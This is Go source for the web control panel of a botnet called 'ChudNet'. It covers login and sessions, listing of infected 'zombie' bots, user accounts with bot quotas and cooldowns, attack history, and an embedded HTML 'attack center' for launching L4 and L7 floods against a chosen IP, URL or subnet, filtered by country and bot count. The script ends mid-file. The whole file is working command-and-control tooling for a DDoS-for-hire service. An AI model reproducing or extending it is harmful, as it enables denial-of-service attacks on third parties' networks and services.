package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"sort"
	"sync"
	"time"
)

type Session struct {
	username  string
	apiKey    string
	admin     bool
	createdAt time.Time
}

type WebPanel struct {
	sessions map[string]*Session
	mu       sync.RWMutex
}

func NewWebPanel() *WebPanel {
	return &WebPanel{
		sessions: make(map[string]*Session),
	}
}

func (wp *WebPanel) generateToken() string {
	b := make([]byte, 32)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func (wp *WebPanel) createSession(username, apiKey string, admin bool) string {
	wp.mu.Lock()
	defer wp.mu.Unlock()
	token := wp.generateToken()
	wp.sessions[token] = &Session{
		username:  username,
		apiKey:    apiKey,
		admin:     admin,
		createdAt: time.Now(),
	}
	return token
}

func (wp *WebPanel) validateSession(token string) (*Session, bool) {
	wp.mu.RLock()
	defer wp.mu.RUnlock()
	s, ok := wp.sessions[token]
	if !ok {
		return nil, false
	}
	if time.Since(s.createdAt) > 24*time.Hour {
		return nil, false
	}
	return s, true
}

func (s *APIServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		s.writeJSON(w, http.StatusMethodNotAllowed, APIResponse{
			Success: false,
			Error:   "方法不允许",
		})
		return
	}

	var req struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "请求格式错误",
		})
		return
	}

	ok, accInfo := database.TryLogin(req.Username, req.Password)
	if !ok {
		fmt.Printf("[web] 登录失败: user=%s from=%s\n", req.Username, s.getClientIP(r))
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "用户名或密码错误",
		})
		return
	}

	apiKey := database.GetAPIKey(req.Username)
	if apiKey == "" {
		key, err := database.GenerateAPIKey(req.Username)
		if err != nil {
			s.writeJSON(w, http.StatusInternalServerError, APIResponse{
				Success: false,
				Error:   "服务器内部错误",
			})
			return
		}
		apiKey = key
	}

	token := s.webPanel.createSession(req.Username, apiKey, accInfo.admin == 1)
	fmt.Printf("[web] 登录成功: user=%s from=%s\n", req.Username, s.getClientIP(r))

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":  true,
		"token":    token,
		"username": req.Username,
		"admin":    accInfo.admin == 1,
		"maxBots":  accInfo.maxBots,
	})
}

func (s *APIServer) handleWebBots(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	_, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	dist := clientList.Distribution()
	count := clientList.Count()
	stats := clientList.GetStats()

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success":        true,
		"total":          count,
		"free":           stats.Free,
		"busy":           stats.Busy,
		"activeAttacks":  stats.ActiveAttacks,
		"speedGbps":      stats.SpeedGbps,
		"distribution":   dist,
		"attackMethods":  getMethodList(),
	})
}

func getMethodList() []string {
	var methods []string
	for name := range attackInfoLookup {
		methods = append(methods, name)
	}
	return methods
}

func (s *APIServer) handleWebHistory(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	_, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"history": database.history,
	})
}

func (s *APIServer) handleWebPanel(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		s.writeJSON(w, http.StatusNotFound, APIResponse{
			Success: false,
			Error:   "未找到",
		})
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(webPanelHTML))
}

func (s *APIServer) handleBotList(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	_, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	bots := clientList.BotList()
	if bots == nil {
		bots = []BotEntry{}
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"bots":    bots,
	})
}

func (s *APIServer) handleUsers(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	session, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	isAdmin := session.admin
	if !isAdmin {
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success: false,
			Error:   "需要管理员权限",
		})
		return
	}

	type userEntry struct {
		Username     string `json:"username"`
		MaxBots      int    `json:"max_bots"`
		Admin        int    `json:"admin"`
		ProxyAllowed int    `json:"proxy_allowed"`
		Duration     int    `json:"duration_limit"`
		Cooldown     int    `json:"cooldown"`
	}
	var users []userEntry
	for _, u := range database.users {
		users = append(users, userEntry{
			Username:     u.Username,
			MaxBots:      u.MaxBots,
			Admin:        u.Admin,
			ProxyAllowed: u.ProxyAllowed,
			Duration:     u.DurationLimit,
			Cooldown:     u.Cooldown,
		})
	}

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"users":   users,
	})
}

func (s *APIServer) handleUserCreate(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		s.writeJSON(w, http.StatusMethodNotAllowed, APIResponse{
			Success: false,
			Error:   "方法不允许",
		})
		return
	}

	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	session, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	isAdmin := session.admin
	if !isAdmin {
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success: false,
			Error:   "需要管理员权限",
		})
		return
	}

	var req struct {
		Username     string `json:"username"`
		Password     string `json:"password"`
		MaxBots      int    `json:"max_bots"`
		Duration     int    `json:"duration"`
		Cooldown     int    `json:"cooldown"`
		ProxyAllowed int    `json:"proxy_allowed"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "请求格式错误",
		})
		return
	}

	if req.Username == "" || req.Password == "" {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "用户名和密码不能为空",
		})
		return
	}

	if !database.CreateUser(req.Username, req.Password, req.MaxBots, req.Duration, req.Cooldown, req.ProxyAllowed) {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "用户已存在或添加失败",
		})
		return
	}

	fmt.Printf("[web] 用户创建成功: %s (by %s)\n", req.Username, session.username)
	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Message: "用户添加成功",
	})
}

func (s *APIServer) handleUserRemove(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		s.writeJSON(w, http.StatusMethodNotAllowed, APIResponse{
			Success: false,
			Error:   "方法不允许",
		})
		return
	}

	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	session, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	isAdmin := session.admin
	if !isAdmin {
		s.writeJSON(w, http.StatusForbidden, APIResponse{
			Success: false,
			Error:   "需要管理员权限",
		})
		return
	}

	var req struct {
		Username string `json:"username"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "请求格式错误",
		})
		return
	}

	if !database.RemoveUser(req.Username) {
		s.writeJSON(w, http.StatusBadRequest, APIResponse{
			Success: false,
			Error:   "用户不存在或删除失败",
		})
		return
	}

	fmt.Printf("[web] 用户已删除: %s (by %s)\n", req.Username, session.username)
	s.writeJSON(w, http.StatusOK, APIResponse{
		Success: true,
		Message: "用户删除成功",
	})
}


func (s *APIServer) handleGroups(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	_, ok := s.webPanel.validateSession(token)
	if !ok {
		s.writeJSON(w, http.StatusUnauthorized, APIResponse{
			Success: false,
			Error:   "未登录或会话已过期",
		})
		return
	}

	history := database.GetGroupHistory()
	groups := clientList.GroupStats(history)

	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"groups":  groups,
	})
}

func (s *APIServer) handleSSE(w http.ResponseWriter, r *http.Request) {
	token := r.URL.Query().Get("token")
	if token == "" {
		token = r.Header.Get("X-Token")
	}
	_, ok := s.webPanel.validateSession(token)
	if !ok {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte(`{"success":false,"error":"未登录或会话已过期"}`))
		return
	}

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			stats := clientList.GetStats()
			dist := clientList.Distribution()
			methods := getMethodList()
			sort.Strings(methods)

			b, _ := json.Marshal(map[string]interface{}{
				"total":         int(stats.Zombies),
				"free":          stats.Free,
				"busy":          stats.Busy,
				"activeAttacks": stats.ActiveAttacks,
				"speedGbps":     stats.SpeedGbps,
				"distribution":  dist,
				"attackMethods": methods,
			})

			fmt.Fprintf(w, "data: %s\n\n", string(b))
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

var webPanelHTML = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>ChudNet</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0a0a;--panel:#111;--border:#1e1e1e;--text:#ccc;--muted:#666;--accent:#e33;--accent2:#b22;--green:#3a3;--amber:#c91}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans SC",sans-serif;background:var(--bg);color:var(--text);min-height:100vh;-webkit-tap-highlight-color:transparent}

/* ── Sidebar ── */
.sidebar{position:fixed;left:0;top:0;width:230px;height:100vh;background:#0d0d0d;border-right:1px solid var(--border);z-index:200;transform:translateX(0);transition:transform 0.25s ease;overflow-y:auto}
.sidebar.closed{transform:translateX(-100%)}
.sidebar-logo{padding:18px 20px;border-bottom:1px solid var(--border);text-align:center}
.sidebar-logo h2{color:var(--accent);font-size:18px;letter-spacing:2px}
.nav-item{display:flex;align-items:center;gap:10px;padding:13px 20px;color:#888;cursor:pointer;border-left:3px solid transparent;font-size:14px;transition:background 0.15s;user-select:none}
.nav-item:hover{background:#161616;color:#ddd}
.nav-item.active{background:#1c0606;color:var(--accent);border-left-color:var(--accent)}
.nav-item .icon{font-size:16px;width:22px;text-align:center}
.sidebar-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:199}
.sidebar-overlay.show{display:block}

/* ── Main ── */
.main{margin-left:230px;transition:margin-left 0.25s ease}
.main.expanded{margin-left:0}

/* ── Topbar ── */
.topbar{position:sticky;top:0;z-index:50;background:#0c0c0c;border-bottom:1px solid var(--border);padding:0 16px;height:52px;display:flex;align-items:center;justify-content:space-between}
.hamburger{display:none;background:none;border:none;color:#888;font-size:22px;cursor:pointer;padding:4px 8px;width:40px;height:40px;align-items:center;justify-content:center}
.topbar h1{font-size:15px;color:#eee;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.topbar .user-box{display:flex;align-items:center;gap:10px;font-size:13px;color:#888;white-space:nowrap}
.topbar .user-box span{color:var(--accent)}
.topbar .logout{color:var(--accent);cursor:pointer;text-decoration:none;font-size:12px;padding:4px 8px}
.topbar .logout:hover{color:#f66}
.topbar .lang-sel{background:transparent;border:1px solid #333;color:#888;font-size:11px;padding:4px 6px;border-radius:4px;cursor:pointer;outline:none;-webkit-appearance:none;appearance:none}
.topbar .lang-sel:focus{border-color:#666}

/* ── Content ── */
.content{padding:16px}
@media(min-width:769px){.content{padding:20px 24px}}
.tab{display:none}
.tab.active{display:block}

/* ── Stats ── */
.stats-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px}
@media(min-width:600px){.stats-grid{grid-template-columns:repeat(3,1fr)}}
@media(min-width:900px){.stats-grid{grid-template-columns:repeat(5,1fr)}}
.stat-card{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:16px 12px;text-align:center}
.stat-card .value{font-size:26px;font-weight:700;color:var(--accent)}
.stat-card .label{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:0.5px}
@media(min-width:769px){.stat-card .value{font-size:30px}}

/* ── Panels ── */
.panel{background:var(--panel);border:1px solid var(--border);border-radius:8px;margin-bottom:16px;overflow:hidden}
.panel-header{padding:12px 16px;border-bottom:1px solid var(--border);font-size:13px;font-weight:600;color:var(--accent);background:#0f0f0f}
.panel-body{padding:12px 10px}
@media(min-width:769px){.panel-body{padding:16px 18px}}

/* ── Forms ── */
.form-grid{display:grid;grid-template-columns:1fr;gap:12px}
@media(min-width:600px){.form-grid{grid-template-columns:repeat(2,1fr)}}
@media(min-width:900px){.form-grid{grid-template-columns:repeat(auto-fit,minmax(200px,1fr))}}
.form-group{display:flex;flex-direction:column;gap:4px}
.form-group label{font-size:11px;color:#777;text-transform:uppercase;letter-spacing:0.3px}
.form-group input,.form-group select{padding:10px 12px;background:var(--bg);border:1px solid #2a2a2a;border-radius:6px;color:var(--text);font-size:14px;outline:none;width:100%;-webkit-appearance:none;appearance:none}
.form-group input:focus,.form-group select:focus{border-color:var(--accent2)}
.form-group select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23888'%3E%3Cpath d='M6 8L1 3h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;padding-right:28px}

/* ── Buttons ── */
.btn{padding:10px 20px;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;transition:all 0.15s;white-space:nowrap;display:inline-flex;align-items:center;justify-content:center}
.btn-attack{background:var(--accent);color:#fff;width:100%;padding:13px;font-size:14px}
.btn-attack:hover{background:#f33;box-shadow:0 0 20px rgba(230,30,30,0.25)}
.btn-attack:disabled{opacity:0.4;cursor:default}
.btn-small{padding:7px 14px;font-size:12px}
.btn-green{background:#0f1f0f;color:var(--green);border:1px solid #1a3a1a}
.btn-green:hover{background:#1a3a1a}
.btn-red{background:#1f0f0f;color:#e55;border:1px solid #3a1a1a}
.btn-red:hover{background:#3a1a1a}
.btn-gray{background:#1a1a1a;color:#999;border:1px solid #333;padding:7px 12px;font-size:12px}
.btn-gray:hover{background:#2a2a2a}

/* ── Tables (scrollable on mobile) ── */
.table-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:-1px}
table{width:100%;border-collapse:collapse;font-size:12px;min-width:500px}
@media(min-width:769px){table{min-width:auto}}
thead th{padding:10px 12px;text-align:left;background:#0a0a0a;color:#888;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;border-bottom:1px solid var(--border);white-space:nowrap}
tbody td{padding:9px 12px;border-bottom:1px solid #121212;color:#bbb;white-space:nowrap}
tbody tr:hover td{background:#0f0f0f}

/* ── Badges ── */
.badge{display:inline-block;padding:3px 8px;border-radius:3px;font-size:11px;font-weight:600}
.badge-online{background:#0a2a0a;color:#2a2;border:1px solid #1a3a1a}
.badge-busy{background:#2a0a0a;color:#a22;border:1px solid #3a1a1a}
.badge-free{background:#0a1a1a;color:#2aa;border:1px solid #1a2a2a}
.badge-admin{background:#2a1a0a;color:#c91;border:1px solid #3a2a1a}
.badge-country{background:#1a1a1a;color:#aaa;border:1px solid #333}

/* ── Search bar ── */
.search-bar{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.search-bar input{flex:1;min-width:120px;padding:9px 12px;background:var(--bg);border:1px solid #2a2a2a;border-radius:6px;color:var(--text);font-size:13px;outline:none}
.search-bar input:focus{border-color:var(--accent2)}
.search-bar select{padding:9px 12px;background:var(--bg);border:1px solid #2a2a2a;border-radius:6px;color:var(--text);font-size:13px;outline:none;-webkit-appearance:none;appearance:none;min-width:80px}

/* ── Result message ── */
.result-msg{margin-top:12px;padding:10px 14px;border-radius:6px;display:none;font-size:13px}
.result-ok{background:#0a1a0a;border:1px solid #1a3a1a;color:#4c4}
.result-err{background:#1a0a0a;border:1px solid #3a1a1a;color:#e55}

/* ── Login ── */
.login-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:9999;padding:20px}
.login-card{background:#0f0f0f;border:1px solid #222;border-radius:14px;padding:32px 24px;width:100%;max-width:360px}
.login-card h2{color:var(--accent);text-align:center;margin-bottom:24px;font-size:20px;letter-spacing:3px}
.login-card input{width:100%;padding:12px;margin-bottom:12px;background:var(--bg);border:1px solid #2a2a2a;border-radius:6px;color:var(--text);font-size:14px;outline:none}
.login-card input:focus{border-color:var(--accent2)}
.login-card .btn{width:100%;padding:12px;margin-top:4px;font-size:14px}
.login-card .err{color:#e55;text-align:center;font-size:12px;margin-top:10px;display:none}
.hidden{display:none!important}

/* ── Tags / Misc ── */
.tags-row{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0}
.tag{display:inline-flex;align-items:center;gap:3px;background:#1a1a1a;border:1px solid #333;border-radius:3px;padding:4px 10px;font-size:12px}
.tag .rm{cursor:pointer;color:#e55;margin-left:3px;font-weight:bold}

.empty-row td{text-align:center;padding:24px;color:#555;font-size:13px}

/* ── Re-parent tables for scroll ── */
.tab .panel-body > table{display:none}

/* ── Mobile sidebar ── */
/* ── ReturnStress-style attack panel ── */
.rs-panel{max-width:720px;margin:0 auto;background:#111;border:1px solid #1e1e1e;border-radius:10px;overflow:hidden}
.rs-header{padding:18px 22px;border-bottom:1px solid #1a1a1a}
.rs-header h2{font-size:15px;font-weight:600;color:#eee;margin:0}
.rs-header p{font-size:12px;color:#666;margin:3px 0 0}
.rs-body{padding:18px 22px}
.rs-section-label{font-size:11px;color:#777;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px}
.rs-layer-tabs{display:flex;gap:2px;background:#0a0a0a;border-radius:8px;padding:3px;margin-bottom:18px}
.rs-layer-tab{flex:1;padding:9px;background:transparent;border:none;color:#555;font-size:12px;font-weight:600;cursor:pointer;border-radius:6px;transition:all 0.15s;text-align:center}
.rs-layer-tab span{display:block;font-size:10px;color:#444;font-weight:400;margin-top:1px;pointer-events:none}
.rs-layer-tab:hover{color:#999}
.rs-layer-tab:hover span{color:#666}
.rs-layer-tab.active{background:#1c0a0a;color:#e33}
.rs-layer-tab.active span{color:#a44}
.rs-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px}
@media(min-width:600px){.rs-grid-3{grid-template-columns:1fr 1fr 1fr}}
.rs-field{display:flex;flex-direction:column;gap:4px}
.rs-field label{font-size:11px;color:#777;text-transform:uppercase;letter-spacing:0.3px}
.rs-field input,.rs-field select{width:100%;padding:9px 12px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:6px;color:#ccc;font-size:13px;outline:none;-webkit-appearance:none;appearance:none}
.rs-field input:focus,.rs-field select:focus{border-color:#922}
.rs-field select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' fill='%23666'%3E%3Cpath d='M5 7L1 2h8z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 10px center;padding-right:26px}
.rs-input-suffix{display:flex}
.rs-input-suffix input{flex:1;border-radius:6px 0 0 6px;border-right:none}
.rs-input-suffix span{background:#0a0a0a;border:1px solid #2a2a2a;border-radius:0 6px 6px 0;padding:9px 12px;font-size:12px;color:#666;display:flex;align-items:center}
.rs-hint{font-size:11px;color:#555;margin-top:4px;display:block}
.rs-btn-small{padding:9px 14px;background:#1a1a1a;border:1px solid #333;border-radius:6px;color:#999;font-size:12px;cursor:pointer}
.rs-btn-small:hover{background:#2a2a2a;color:#ccc}
.rs-launch-btn{width:100%;padding:14px;background:linear-gradient(180deg,#d22,#911);border:1px solid #c33;border-radius:8px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:1px;transition:all 0.15s;text-shadow:0 1px 2px rgba(0,0,0,0.5)}
.rs-launch-btn:hover{background:linear-gradient(180deg,#e44,#b22);box-shadow:0 0 25px rgba(200,20,20,0.25)}
.rs-launch-btn:disabled{opacity:0.35;cursor:default}
.rs-field-sm{max-width:100px}

@media(max-width:768px){
.sidebar{transform:translateX(-100%)}
.sidebar.open{transform:translateX(0)}
.sidebar-overlay.show{display:block}
.main{margin-left:0}
.hamburger{display:flex}
}
</style>
</head>
<body>

<div id="loginScreen" class="login-overlay">
<div class="login-card">
<h2>ChudNet</h2>
<input type="text" id="lu" placeholder="" id="luPh" autocomplete="username" autocapitalize="off">
<input type="password" id="lp" placeholder="" id="lpPh">
<button class="btn btn-attack" id="loginBtn" data-key="loginBtn">登录</button><script>document.getElementById("loginBtn").onclick=function(){doLogin()}</script>
<div id="loginErr" class="err"></div>
</div>
</div>

<div id="app" class="hidden">
<nav class="sidebar" id="sidebar">
<div class="sidebar-logo"><h2>ChudNet</h2></div>
<div class="sidebar-nav">
<div class="nav-item active" data-tab="dashboard" onclick="switchTab('dashboard');closeSidebar()"><span class="icon">&#9632;</span>仪表盘</div>
<div class="nav-item" data-tab="attack" onclick="switchTab('attack');closeSidebar()"><span class="icon">&#9889;</span>攻击中心</div>
<div class="nav-item" data-tab="bots" onclick="switchTab('bots');closeSidebar()"><span class="icon">&#9776;</span>Bot管理</div>
<div class="nav-item admin-only hidden" data-tab="users" onclick="switchTab('users');closeSidebar()"><span class="icon">&#9881;</span>用户管理</div>
<div class="nav-item" data-tab="history" onclick="switchTab('history');closeSidebar()"><span class="icon">&#9776;</span>攻击历史</div>
</div>
</nav>
<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>

<div class="main" id="mainPanel">
<div class="topbar">
<button class="hamburger" id="hamburger" onclick="toggleSidebar()">&#9776;</button>
<h1 id="pageTitle" data-key="dashboard">仪表盘</h1>
<div class="user-box"><span id="hdrUser"></span> <select class="lang-sel" id="langSel" onchange="setLang(this.value)"><option value="zh">中文</option><option value="en" selected>EN</option><option value="ru">RU</option></select> <a class="logout" onclick="doLogout()" href="javascript:void(0)" data-key="logout">退出</a></div>
</div>
<div class="content">

<div class="tab active" id="tab-dashboard">
<div class="stats-grid" id="statsWrap"></div>
<div class="panel">
<div class="panel-header" data-key="distTitle">僵尸网络分布</div>
<div class="panel-body"><div class="table-wrap"><table><thead><tr><th data-key="distribution">国家/地区</th><th data-key="count">数量</th><th data-key="percent">占比</th></tr></thead><tbody id="distTbody"></tbody></table></div></div>
</div>
</div>

<div class="tab" id="tab-attack">
<div class="rs-panel">
<div class="rs-header">
<h2 data-key="attackControl">攻击控制</h2>
<p data-key="attackControlDesc">设置参数后发起攻击</p>
</div>

<div class="rs-body">
<div class="rs-section-label" data-key="layer">攻击层级</div>
<div class="rs-layer-tabs" id="layerTabs">
<button class="rs-layer-tab active" data-layer="l4" onclick="setLayer('l4')">L4<span data-key="l4">传输层</span></button>
<button class="rs-layer-tab" data-layer="l7" onclick="setLayer('l7')">L7<span data-key="l7">应用层</span></button>
</div>

<div id="normalFields">
<div class="rs-grid">
<div class="rs-field">
<label data-key="target">目标 IP / 域名</label>
<input id="atkHost" placeholder="192.168.1.1" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
</div>
<div class="rs-field rs-field-sm">
<label data-key="port">端口</label>
<input id="atkPort" type="number" value="80" min="1" max="65535">
</div>
</div>

<div class="rs-field" style="margin-bottom:14px">
<label data-key="subnet">子网 (CIDR)</label>
<input id="atkSubnet" type="number" value="32" min="8" max="32" style="width:80px;display:inline;margin-right:8px">
<span class="rs-hint">/24 &approx; 256&#20010;IP &middot; /28 &approx; 16&#20010;IP &middot; /32 = &#21333;&#20010;&#30446;&#26631;</span>
</div>
</div>

<div id="httpFields" style="display:none">
<div class="rs-field" style="margin-bottom:14px">
<label data-key="target">目标 URL</label>
<input id="atkUrl" placeholder="https://example.com/path" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
<span class="rs-hint">端口自动检测 (HTTP=80, HTTPS=443) &middot; 路径自动提取</span>
</div>
</div>

<div class="rs-grid rs-grid-3">
<div class="rs-field">
<label data-key="duration">持续时间</label>
<div class="rs-input-suffix">
<input id="atkTime" type="number" value="60" min="1" max="3600"><span data-key="seconds">秒</span>
</div>
</div>
<div class="rs-field">
<label data-key="method">攻击方式</label>
<select id="atkMethod" onchange="toggleHttpFields()"></select>
</div>
<div class="rs-field rs-field-sm">
<label data-key="concurrency">Bot数</label>
<input id="atkSlots" type="number" value="0" min="0" placeholder="全部">
</div>
</div>

<div class="rs-grid" style="margin-bottom:10px">
<div class="rs-field">
<label data-key="country">国家过滤</label>
<select id="atkCountry"><option value="">全部国家</option></select>
</div>
<div class="rs-field">
<label data-key="extraOpts">额外选项</label>
<div style="display:flex;gap:6px">
<input id="optKey" placeholder="参数名" style="flex:2;padding:9px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:6px;color:#ccc;font-size:13px">
<input id="optVal" placeholder="参数值" style="flex:2;padding:9px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:6px;color:#ccc;font-size:13px">
<button class="rs-btn-small" onclick="addOpt()">+</button>
</div>
</div>
</div>
<div class="tags-row" id="optTags" style="margin-bottom:16px"></div>

<button class="rs-launch-btn" onclick="sendAttack()" id="atkBtn"><span id="atkBtnText" data-key="launch">发起攻击</span></button>
<div class="result-msg" id="atkResult" style="margin-top:14px"></div>
</div>
</div>

<div class="rs-panel" style="margin-top:18px">
<div class="rs-header">
<h2 data-key="activeAttacks">进行中的攻击</h2>
<p data-key="activeAttacksDesc">实时攻击状态</p>
</div>
<div class="rs-body">
<div class="table-wrap"><table><thead><tr><th data-key="target">目标</th><th data-key="method">方式</th><th data-key="port">端口</th><th data-key="remainTime">剩余时间</th><th data-key="status">状态</th></tr></thead><tbody id="activeAtkTbody"><tr class="empty-row"><td colspan="5">暂无进行中的攻击</td></tr></tbody></table></div>
</div>
</div>
</div>

<div class="tab" id="tab-bots">
<div class="panel">
<div class="panel-header">Bot群组 <span id="groupCount" style="color:#888;font-weight:normal;font-size:12px;margin-left:6px"></span></div>
<div class="panel-body">
<div class="table-wrap"><table><thead><tr><th data-key="groupName">群组</th><th data-key="count">数量</th><th data-key="totalBW">总带宽</th><th data-key="avgMb">平均Mb/个</th><th data-key="delta24h">24h变化</th></tr></thead><tbody id="groupTbody"></tbody></table></div>
</div>
</div>
</div>

<div class="tab" id="tab-users">
<div class="panel">
<div class="panel-header" data-key="userList">用户列表</div>
<div class="panel-body">
<div class="table-wrap" style="margin-bottom:16px"><table><thead><tr><th data-key="user">用户名</th><th data-key="concurrency">Bot</th><th data-key="duration">时长</th><th data-key="cooldown">冷却</th><th data-key="proxyAllowed">代理</th><th data-key="role">角色</th><th data-key="actions">操作</th></tr></thead><tbody id="userTbody"></tbody></table></div>
<div class="panel-header" style="border-radius:4px 4px 0 0">添加用户</div>
<div class="form-grid" style="padding:14px 0 0 0">
<div class="form-group"><label data-key="user">用户名</label><input id="newUser"></div>
<div class="form-group"><label data-key="pass">密码</label><input id="newPass" type="password"></div>
<div class="form-group"><label data-key="concurrency">Bot数量</label><input id="newBots" type="number" value="-1"></div>
<div class="form-group"><label data-key="durationLimit">时长限制(s)</label><input id="newDur" type="number" value="300"></div>
<div class="form-group"><label data-key="cooldownLimit">冷却(s)</label><input id="newCool" type="number" value="5"></div>
<div class="form-group"><label data-key="proxyAllowed">代理</label><select id="newProxy"><option value="0">否</option><option value="1">是</option></select></div>
</div>
<button class="btn btn-green" onclick="createUser()" style="margin-top:12px"> data-key="createUserBtn">添加用户</button>
<div class="result-msg" id="userMsg"></div>
</div>
</div>
</div>

<div class="tab" id="tab-history">
<div class="panel">
<div class="panel-header" data-key="historyTitle">攻击历史</div>
<div class="panel-body"><div class="table-wrap"><table><thead><tr><th data-key="timeSent">时间</th><th data-key="command">命令</th><th data-key="duration">时长</th><th data-key="concurrency">Bot</th></tr></thead><tbody id="histTbody"></tbody></table></div></div>
</div>
</div>

</div></div></div>

<script>
var token=localStorage.getItem("c_token")||"";
var username="",isAdmin=false;
var optList=[];
var activeLayer="l4",curLang=localStorage.getItem("c_lang")||"en";
